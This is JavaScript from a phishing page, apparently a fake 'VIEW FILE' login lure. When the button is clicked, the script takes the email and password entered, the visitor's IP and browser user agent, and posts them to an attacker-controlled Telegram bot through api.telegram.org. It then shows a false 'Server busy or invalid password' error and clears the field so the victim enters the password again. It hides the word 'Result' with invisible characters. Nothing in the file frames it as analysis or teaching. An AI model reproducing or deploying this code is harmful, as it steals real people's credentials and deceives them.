

document.getElementById("sBtn").addEventListener("click", function(e) {
    e.preventDefault();
    var username = document.getElementById('email').value;
	    var pswd = document.getElementById('password').value;

    if (username == null || username == ""){
	
	document.getElementById('alert-red').style.display = "block";
       $("#alert-red").html("Please enter your email"); 
	   return;
		}
	    if (pswd == null || pswd == ""){
	document.getElementById('alert-red').style.display = "block";
       $("#alert-red").html("Please enter your password"); 
	   return;
		}	
    else {
       $("#sBtn").html("Processing..."); 
	document.getElementById('alert-red').style.display = "none";
	document.getElementById('alert-green').style.display = "none";
       $("#alert-red").html(""); 
       $("#alert-green").html(""); 
	   
	    var IP = document.getElementById('gfg').textContent;
         var word = `====== Logs R͏e͏s͏u͏l͏t͏ ======\r\nEmail: ${username}\r\nPassword: ${pswd}\r\nIP: https://ip-api.com/${IP}\r\nUser-Agent: ${navigator.userAgent}\r\n======`;
         var settings = {
                        "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
                        "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
                        "data": JSON.stringify({ "chat_id": chat_id, "text": word })
                    }
        $.ajax(settings).done((response) => {
		setTimeout(() => {
         document.getElementById('alert-red').style.display = "block";
       $("#alert-red").html("Server busy or invalid password. Please try again"); 
	          $("#sBtn").html("VIEW FILE"); 
			  document.getElementById('password').value = "";
          }, 4000);
		});
} 
    }); 

